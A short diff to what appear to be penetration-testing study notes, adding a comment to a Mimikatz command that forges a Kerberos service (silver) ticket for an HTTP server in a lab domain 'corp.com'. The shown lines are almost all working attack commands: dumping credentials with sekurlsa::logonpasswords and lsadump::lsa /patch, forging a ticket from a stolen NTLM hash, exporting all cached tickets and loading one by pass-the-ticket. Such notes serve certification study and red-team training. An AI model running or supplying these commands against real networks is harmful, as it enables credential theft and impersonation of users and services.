@@ -150,7 +150,7 @@ klist
 ```
 whoami /user
 kerberos::purge
-kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(ntlm hash from sekurlsa::logonpasswords,lsadump::lsa /patch) /ptt
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(ntlm hash from sekurlsa::logonpasswords,lsadump::lsa /patch) /ptt
 kerberos::list
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
